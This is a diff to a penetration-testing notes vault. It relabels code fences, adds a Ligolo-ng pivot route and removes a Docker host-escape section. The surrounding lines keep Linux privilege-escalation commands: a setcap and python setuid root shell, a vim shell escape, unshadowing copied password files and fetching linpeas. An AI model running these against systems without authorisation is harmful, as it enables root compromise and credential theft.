@@ -1742,6 +1742,20 @@ ip route get INTERNAL_IP
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
+**Ligolo-ng: Quick Reference**
+
+```bash
+sudo ip route add 240.0.0.1/32 dev ligolo
+curl -I http://240.0.0.1:8080/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng: Quick Reference — Create and start the tunnel](/pivoting/ligolo#create-and-start-the-tunnel)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Isolate failures">
@@ -1871,7 +1885,7 @@ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadow.hashes
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 # Exploitable when a user have the following permissions (sudo -l)
 (ALL, !root) ALL
 
@@ -1911,26 +1925,6 @@ sudo chmod +s /tmp/suid # setuid bit
 
 </Accordion>
 
-<Accordion title="Docker">
-
-### Docker
-
-**Linux Privilege Escalation: Full Checklist**
-
-```powershell
-sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
-sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — Docker](/privesc/linux-privesc-checklist#docker)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="Establish the baseline">
 
 ### Establish the baseline
@@ -1962,7 +1956,7 @@ sudo -l
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 $ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
 
 $ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
@@ -2021,7 +2015,7 @@ sudo -u root vim -c '!sh'
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 ╭─swissky@lab ~  
 ╰─$ ls /usr/bin/sudo -alh                  
 -rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
@@ -2042,7 +2036,7 @@ sudo -u root vim -c '!sh'
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
 curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
 ./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
@@ -2065,7 +2059,7 @@ curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.s
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 $ sudo whatever
 [sudo] password for user:    
 # Press <ctrl>+c since you don't have the password. 
@@ -3629,6 +3623,8 @@ rusers -al <IP>                # detailed logged-in user info
 - [Official documentation 1](https://www.sudo.ws/docs/man/sudo.man/)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
